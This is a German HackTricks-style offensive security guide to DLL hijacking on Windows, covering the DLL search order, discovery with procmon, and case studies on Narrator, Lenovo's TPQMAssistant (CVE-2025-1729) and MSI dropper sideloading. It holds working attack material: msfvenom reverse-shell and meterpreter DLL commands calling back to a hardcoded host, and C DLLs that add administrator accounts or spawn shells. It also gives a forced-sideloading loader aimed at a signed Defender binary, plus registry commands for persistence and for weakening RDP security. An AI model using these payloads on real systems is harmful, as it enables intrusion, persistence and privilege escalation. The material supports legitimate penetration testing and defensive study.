# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für Codeausführung, Persistenz und seltener für Privilegieneskalation verwendet. Obwohl hier der Fokus auf Eskalation liegt, bleibt die Methode des Hijackings über die Ziele hinweg gleich.

### Common Techniques

Es werden verschiedene Methoden für DLL Hijacking verwendet, deren Wirksamkeit vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional mit DLL Proxying, um die ursprüngliche Funktionalität zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL, um das Suchmuster der Anwendung auszunutzen.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung lädt, weil sie denkt, die erforderliche DLL existiere nicht.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu verweisen.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich den Binary Proxy Execution-Techniken.

## Finding missing Dlls

Die häufigste Methode, um fehlende Dlls in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und dann nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn du nach **fehlenden dlls im Allgemeinen** suchst, lässt du das für einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden dll in einer bestimmten ausführbaren Datei** suchst, solltest du **einen weiteren Filter wie "Process Name" "contains" `<exec name>` setzen, die Anwendung ausführen und die Ereignisaufnahme stoppen**.

## Exploiting Missing Dlls

Um Privilegien zu eskalieren, ist die beste Chance, eine DLL zu schreiben, die ein privilegierter Prozess zu laden versucht, an einem Ort, an dem sie gesucht wird. Daher können wir eine DLL in einen Ordner schreiben, in dem die DLL vor dem Ordner gesucht wird, in dem die **original dll** liegt (seltener Fall), oder wir können in einen Ordner schreiben, in dem die DLL gesucht wird und die ursprüngliche DLL in keinem Ordner existiert.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-Anwendungen suchen nach DLLs, indem sie eine Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge abarbeiten. Das Problem des DLL Hijackings entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung, um dies zu verhindern, ist sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Die **DLL-Suchreihenfolge unter 32-bit** Systemen ist wie folgt:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses ermittelt, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.
1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgelistet sind. Beachte, dass dies nicht den pro-Anwendung-Pfad einschließt, der durch den **App Paths**-Registry-Schlüssel angegeben ist. Der **App Paths**-Schlüssel wird nicht bei der Berechnung des DLL-Suchpfads verwendet.

Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn sie deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine dll auch mittels absolutem Pfad geladen werden kann anstatt nur dem Namen**. In diesem Fall wird die DLL **nur in diesem Pfad gesucht** (falls die dll Abhängigkeiten hat, werden diese so gesucht, als wären sie nur nach Namen geladen worden).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu verändern, die hier nicht erklärt werden.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, um die DLL-Suchpfade eines neu erstellten Prozesses deterministisch zu beeinflussen, ist das Setzen des DllPath-Feldes in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen ntdll-APIs. Indem man hier ein vom Angreifer kontrolliertes Verzeichnis angibt, kann ein Zielprozess, der eine importierte DLL nach Namen auflöst (kein absoluter Pfad und ohne sichere Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Baue die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf dein kontrolliertes Verzeichnis zeigt (z. B. das Verzeichnis, in dem dein Dropper/Unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Ziel-Binary eine DLL nach Namen auflöst, wird der Loader diesen bereitgestellten DllPath bei der Auflösung konsultieren und zuverlässiges sideloading ermöglichen, selbst wenn die bösartige DLL nicht im selben Verzeichnis wie das Ziel-EXE liegt.

Hinweise/Einschränkungen
- Dies betrifft den zu erstellenden Kindprozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL nach Namen importieren oder mit LoadLibrary laden (kein absoluter Pfad und ohne Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht gehijackt werden. Forwarded exports und SxS können die Präzedenz ändern.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von DLL-Sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Beispiel für den operativen Einsatz
- Platziere eine bösartige xmllite.dll (die die erforderlichen Funktionen exportiert oder auf die echte weiterleitet) in deinem DllPath-Verzeichnis.
- Starte ein signiertes Binary, von dem bekannt ist, dass es xmllite.dll per Namen nachschlägt, indem du die oben beschriebene Technik anwendest. Der Loader löst den Import über den angegebenen DllPath auf und sideloads deine DLL.

Diese Technik wurde in-the-wild beobachtet, um mehrstufige sideloading-Ketten zu erzeugen: Ein anfänglicher Launcher legt eine Hilfs-DLL ab, die dann ein Microsoft-signed, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.


#### Ausnahmen bei der dll-Suchreihenfolge aus Windows docs

Bestimmte Ausnahmen von der Standard-DLL-Suchreihenfolge werden in der Windows-Dokumentation erwähnt:

- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL hat**, angetroffen wird, umgeht das System die übliche Suche. Stattdessen prüft es auf Umleitung und ein Manifest, bevor es standardmäßig die bereits im Speicher befindliche DLL verwendet. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- Wenn die DLL als eine **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der known DLL zusammen mit allen abhängigen DLLs und **verzichtet auf den Suchprozess**. Der Registry-Schlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Falls eine **DLL Abhängigkeiten hat**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **Module-Namen** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontale oder laterale Bewegung), und dem **eine DLL fehlt**.
- Stelle sicher, dass **Schreibzugriff** für ein **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, da es **standardmäßig ziemlich ungewöhnlich ist, ein privilegiertes Executable zu finden, dem eine DLL fehlt**, und es noch **ungewöhnlicher ist, Schreibrechte auf einem Ordner im Systempfad zu haben** (standardmäßig hast du das nicht). In fehlkonfigurierten Umgebungen ist dies jedoch möglich. Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das Projekt [UACME](https://github.com/hfiref0x/UACME) ansehen. Auch wenn das **Hauptziel des Projekts das Umgehen von UAC** ist, findest du dort möglicherweise einen **PoC** für Dll hijaking für die jeweilige Windows-Version, den du verwenden kannst (wahrscheinlich reicht es, den Pfad des Ordners zu ändern, auf den du Schreibrechte hast).

Beachte, dass du **deine Berechtigungen in einem Ordner prüfen kannst**, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die imports eines executables und die exports einer dll mit:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren**, wenn man Schreibrechte in einem **System Path folder** hat, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) prüft, ob du Schreibrechte für einen Ordner innerhalb des system PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist eine der wichtigsten Voraussetzungen für eine erfolgreiche Ausnutzung, eine DLL zu **erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird**. Beachte außerdem, dass Dll Hijacking nützlich ist, um [von Medium Integrity level auf High zu eskalieren **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine gültige dll erstellt**, findest du in dieser Studie zu dll hijacking mit Fokus auf dll hijacking zur Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** nützlich sein können oder um eine **DLL mit nicht benötigten exportierten Funktionen** zu erstellen.

## **Erstellen und Kompilieren von DLLs**

### **Dll Proxifying**

Grundsätzlich ist ein **Dll proxy** eine DLL, die beim Laden **deinen bösartigen Code ausführen kann**, aber auch **die erwartete Funktionalität bereitstellt** und **wie erwartet funktioniert**, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du ein ausführbares Programm angeben und die Bibliothek auswählen, die du proxifizieren möchtest, und eine **proxified dll** generieren oder die DLL angeben und eine **proxified dll** erzeugen.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Hole einen meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen Benutzer erstellen (x86 — ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren** muss, die vom victim process geladen werden. Wenn diese Funktionen nicht existieren, wird die **binary sie nicht laden können** und der **exploit wird fehlschlagen**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstieg</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Lokalisierungs-DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL, die can be hijacked for arbitrary code execution and persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und das versuchte Laden des obigen Pfads beobachten.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC-Stille
- Ein naiver hijack wird sprechen/UI hervorheben. Um still zu bleiben, beim attach Narrator threads aufzählen, den main thread öffnen (`OpenThread(THREAD_SUSPEND_RESUME)`) und `SuspendThread` darauf anwenden; in deinem eigenen thread fortfahren. Siehe PoC für vollständigen Code.

Trigger und Persistenz über Accessibility-Konfiguration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem Obigen lädt das Starten von Narrator die platzierte DLL. Auf dem secure desktop (Anmeldebildschirm) CTRL+WIN+ENTER drücken, um Narrator zu starten.

RDP-getriggerte SYSTEM-Ausführung (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP zum Host verbinden, am Anmeldebildschirm CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL läuft als SYSTEM auf dem secure desktop.
- Die Ausführung endet, wenn die RDP-Sitzung geschlossen wird — inject/migrate umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf eine beliebige Binary/DLL zeigt, importieren und dann `configuration` auf diesen AT-Namen setzen. Dadurch wird beliebige Ausführung unter dem Accessibility-Framework ermöglicht.

Hinweise
- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Logik des Payloads kann vollständig in `DLL_PROCESS_ATTACH` liegen; Exports werden nicht benötigt.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.

### Details zur Schwachstelle

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit-Implementierung

Ein Angreifer kann ein bösartiges `hostfxr.dll`-Stub im selben Verzeichnis ablegen und das fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Auf die Ausführung des geplanten Tasks um 9:30 AM im Kontext des aktuellen Benutzers warten.
3. Wenn ein Administrator eingeloggt ist, wenn der Task ausgeführt wird, läuft die bösartige DLL in der Administrator-Session mit medium integrity.
4. Standard UAC bypass techniques ketten, um von medium integrity zu SYSTEM-Privilegien zu eskalieren.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Angreifer kombinieren häufig MSI-basierte droppers mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- Der Benutzer lädt eine MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der dropper schreibt ein legitimes, signiertes EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn das signierte EXE gestartet wird, lädt die Windows DLL search order wsc.dll zuerst aus dem Arbeitsverzeichnis und führt Angreifer-Code unter einem signierten Parent aus (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispielmuster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- In Orca (Microsoft Orca.exe) inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Suche nach mehreren kleinen Fragmenten, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Üblicher Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien in denselben Ordner:
- wsc_proxy.exe: legitim signierter Host (Avast). Der Prozess versucht, wsc.dll per Namen aus seinem Verzeichnis zu laden.
- wsc.dll: attacker DLL. Wenn keine spezifischen Exports erforderlich sind, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten Exports an die echte Bibliothek weiter, während das payload in DllMain ausgeführt wird.
- Erstelle ein minimales DLL-Payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Exportanforderungen verwenden Sie ein Proxy-Framework (z. B. DLLirant/Spartacus), um eine Weiterleitungs-DLL zu erzeugen, die außerdem Ihren Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch das host binary. Wenn der Host absolute Pfade oder sichere Ladeflags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl des host binary und des Export-Sets berücksichtigt werden.

## Referenzen

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
